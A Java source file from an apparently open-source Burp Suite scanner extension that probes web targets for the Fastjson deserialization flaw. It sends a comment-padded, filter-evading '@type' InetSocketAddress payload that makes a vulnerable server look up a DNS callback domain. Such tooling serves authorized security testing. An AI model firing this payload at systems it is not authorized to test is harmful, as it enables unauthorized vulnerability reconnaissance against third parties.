package jrcet.frame.Scanner.Fastjson;

import burp.*;
import jrcet.help.Helper;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import static burp.BurpExtender.*;

public class Fastjson {
    public static String DNSLOG = "";
    public static String TOKEN = "";
    public static void doScan(IHttpRequestResponse iHttpRequestResponse){
        try{
            byte[] request = iHttpRequestResponse.getRequest();
            IRequestInfo iRequestInfo = helpers.analyzeRequest(request);
            List<String> iRequestHeaders =  iRequestInfo.getHeaders();

            List<IHttpHeader> newRequestHeaders = new ArrayList<>();
            newRequestHeaders.add(helpers.buildHeader(":scheme",iRequestInfo.getUrl().getProtocol()));
            newRequestHeaders.add(helpers.buildHeader(":method",iRequestInfo.getMethod()));
            newRequestHeaders.add(helpers.buildHeader(":path",iRequestInfo.getUrl().getPath()));
            for (String header : iRequestHeaders) {
                int index = header.indexOf(":");
                if (index > 0) {
                    String name = header.substring(0, index).trim();
                    String value = header.substring(index + 1).trim();
                    IHttpHeader iHttpHeader = helpers.buildHeader(name.toLowerCase(),value);
                    newRequestHeaders.add(iHttpHeader);
                }
            }

            String randomString = Helper.createRandomString(8);
            byte[] body =  helpers.stringToBytes("\\ufeff{,,,,/*aab*/,,,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");
            byte[] newRequest = helpers.buildHttpMessage(iRequestHeaders,body);

            IHttpRequestResponse newHttpRequestResponse;
            byte[] response;
            if(new String(request, StandardCharsets.UTF_8).contains("HTTP/2")){
                response=callbacks.makeHttp2Request(iHttpRequestResponse.getHttpService(), newRequestHeaders, newRequest);
            }else{
                newHttpRequestResponse=callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), newRequest);
                response = newHttpRequestResponse.getResponse();
            }
        }catch (Exception e){
            stdout.println(e);
        }


    }
}
